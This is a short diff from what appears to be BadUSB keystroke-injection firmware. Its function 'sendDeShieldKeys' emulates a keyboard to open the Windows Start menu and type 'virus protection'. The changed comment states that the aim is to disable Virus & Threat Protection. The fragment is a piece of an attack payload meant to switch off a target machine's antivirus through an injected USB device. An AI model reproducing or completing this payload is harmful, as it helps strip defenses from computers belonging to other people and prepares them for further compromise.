@@ -76,7 +76,7 @@ void sendDeShieldKeys(const BadUsbProgress &progress)
     Keyboard.write(KEY_RETURN);              // ENTER
     timing.wait(kStepDelayMs);               // DELAY 1000
 
-    // --- Enable Virus & Threat Protection ---
+    // --- Disable Virus & Threat Protection ---
     pressShortcut(KEY_LEFT_CTRL, KEY_ESC);   // CONTROL ESCAPE (open Start)
     timing.wait(kStepDelayMs);               // DELAY 1000
     Keyboard.print("virus protection");      // STRING virus protection
